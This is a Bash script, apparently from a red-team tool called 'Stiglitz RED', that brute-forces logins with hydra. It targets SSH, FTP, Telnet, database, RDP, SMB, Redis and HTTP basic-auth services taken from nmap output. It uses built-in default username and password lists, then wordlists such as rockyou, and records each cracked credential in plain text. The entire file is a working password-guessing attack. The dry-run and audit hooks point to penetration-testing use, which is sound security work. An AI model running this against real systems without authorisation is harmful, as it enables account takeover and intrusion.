#!/usr/bin/env bash
# Stiglitz RED — Fase Brute Force (hydra)
# Testa credenciais fracas em serviços com autenticação.
# Wordlists progressivas: senhas comuns → expandida.
# Chamado por: stiglitz_red.sh run_brute()

set -uo pipefail

# Senhas mais comuns — rodada rápida
_COMMON_USERS=(admin root administrator user guest test service operator \
    postgres mysql oracle ftp ssh ubuntu ec2-user deploy)
_COMMON_PASS=(admin password 123456 root toor changeme admin123 password1 \
    letmein pass test guest default "" "admin" qwerty 12345678 Welcome1 \
    P@ssw0rd Passw0rd Secret123 company123)

_write_wordlist() {
    local file="$1"; shift
    printf '%s\n' "$@" > "$file"
}

# Detecta se serviço HTTP tem autenticação básica
_http_has_auth() {
    local host="$1" port="$2"
    local proto="http"; [ "$port" -eq 443 ] 2>/dev/null && proto="https"
    local code
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        --max-time 5 "${proto}://${host}:${port}/" 2>/dev/null)
    [[ "$code" == "401" || "$code" == "403" ]]
}

_run_hydra() {
    local host="$1" port="$2" service="$3"
    local users_file="$4" pass_file="$5"
    local log_file="$6" timeout="${7:-300}"

    timeout "$timeout" hydra \
        -L "$users_file" -P "$pass_file" \
        -s "$port" \
        -t 8 -f -e nsr \
        -o "$log_file" \
        "$host" "$service" \
        2>/dev/null || true
}

_parse_hydra_success() {
    grep -iE "^\[.*\] (host:|login:)" "$1" 2>/dev/null
}

# ── Runner principal ──────────────────────────────────────────────────────────
# Assinatura: run_brute_phase(open_services_file, target_domain,
#                              hydra_dir, confirmed_csv, timeout)
run_brute_phase() {
    local services_file="$1"
    local target_domain="$2"
    local hydra_dir="$3"
    local confirmed_csv="$4"
    local timeout="${5:-300}"

    mkdir -p "$hydra_dir"

    if [ ! -f "$services_file" ] || [ ! -s "$services_file" ]; then
        echo "[brute] Sem serviços abertos identificados — fase ignorada"
        return 0
    fi

    # Preparar wordlists
    local users_file="$hydra_dir/users.txt"
    local common_pass="$hydra_dir/common_pass.txt"
    _write_wordlist "$users_file"  "${_COMMON_USERS[@]}"
    _write_wordlist "$common_pass" "${_COMMON_PASS[@]}"

    # Wordlist expandida disponível?
    local ext_pass=""
    for p in "/usr/share/wordlists/rockyou.txt" \
              "/opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt" \
              "/usr/share/wordlists/fasttrack.txt"; do
        [ -f "$p" ] && ext_pass="$p" && break
    done

    # Mapa de porta → serviço para serviços comuns
    declare -A PORT_SERVICE=(
        [22]="ssh" [21]="ftp" [23]="telnet"
        [3306]="mysql" [5432]="postgres"
        [3389]="rdp" [445]="smb" [139]="smb"
        [6379]="redis" [27017]="mongo"
        [80]="http" [443]="https" [8080]="http" [8443]="https"
    )

    local total_found=0
    local tested_services=0

    while IFS= read -r line; do
        [ -z "$line" ] && continue

        # Formato esperado: "PORT/tcp SERVICE VERSION..." (nmap output)
        local port service
        port=$(echo "$line" | awk '{print $1}' | cut -d'/' -f1)
        service=$(echo "$line" | awk '{print $2}')

        # Se o serviço não está identificado pelo nome, tentar mapa de porta
        [[ -z "$service" || "$service" == "open" ]] && service="${PORT_SERVICE[$port]:-}"
        [ -z "$service" ] && continue

        # Apenas serviços com suporte a brute force no hydra
        case "$service" in
            ssh|ftp|telnet|mysql|postgres|rdp|smb|http|https|redis) ;;
            *) continue ;;
        esac

        ((tested_services++))
        echo "[brute] [$tested_services] $service://$target_domain:$port"

        # HTTP/HTTPS: verificar se tem auth básica
        if [[ "$service" == "http"* ]]; then
            if ! _http_has_auth "$target_domain" "$port"; then
                echo "[brute]   HTTP sem autenticação básica — pulando"
                continue
            fi
        fi

        if [ "${DRY_RUN:-false}" = true ]; then
            echo "[brute]   [DRY-RUN] hydra $service://$target_domain:$port"
            continue
        fi

        local log_file="$hydra_dir/${service}_${port}.log"

        # Rodada 1: senhas comuns (rápido)
        echo "[brute]   Rodada 1: senhas comuns..."
        _run_hydra "$target_domain" "$port" "$service" \
            "$users_file" "$common_pass" "$log_file" "$timeout"

        local found; found=$(_parse_hydra_success "$log_file")

        # Rodada 2: wordlist expandida se disponível e não production
        if [ -z "$found" ] && [ -n "$ext_pass" ] && [ "${PROFILE:-lab}" != "production" ]; then
            echo "[brute]   Rodada 2: wordlist expandida ($ext_pass)..."
            _run_hydra "$target_domain" "$port" "$service" \
                "$users_file" "$ext_pass" "${log_file}.ext" "$timeout"
            found=$(_parse_hydra_success "${log_file}.ext")
        fi

        if [ -n "$found" ]; then
            echo "[brute]   CREDENCIAL ENCONTRADA!"
            while IFS= read -r match_line; do
                local user pass
                user=$(echo "$match_line" | grep -oP "login: \K\S+" 2>/dev/null || echo "?")
                pass=$(echo "$match_line" | grep -oP "password: \K\S+" 2>/dev/null || echo "?")
                echo "BRUTE|HIGH|${service}://${target_domain}:${port}|user=${user}|pass=${pass}" \
                    >> "$confirmed_csv"
                command -v audit &>/dev/null && audit "FINDING_CONFIRMED type=brute target=${service}://${target_domain}:${port} user=${user}"
                ((total_found++))
            done <<< "$found"
        fi

    done < "$services_file"

    echo "[brute] Concluído: $tested_services serviço(s) testado(s), $total_found credencial(is) encontrada(s)"
}
